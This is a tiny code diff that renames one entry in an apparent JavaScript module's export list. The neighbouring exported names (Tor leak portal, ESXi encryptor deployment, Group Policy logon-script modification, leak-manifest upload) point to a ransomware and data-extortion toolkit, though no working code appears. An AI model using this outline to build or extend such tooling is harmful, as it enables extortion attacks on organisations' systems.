@@ -496,7 +496,7 @@ export default {
   provisionTorPortal,
   uploadToS3,
   uploadViaTor,
-  buildEsxiEncryptorStub,
+  buildEsxiEncryptorPayload,
   deployEsxiEncryptor,
   modifyGpoLogonScript,
   uploadLeakManifestAdvanced,
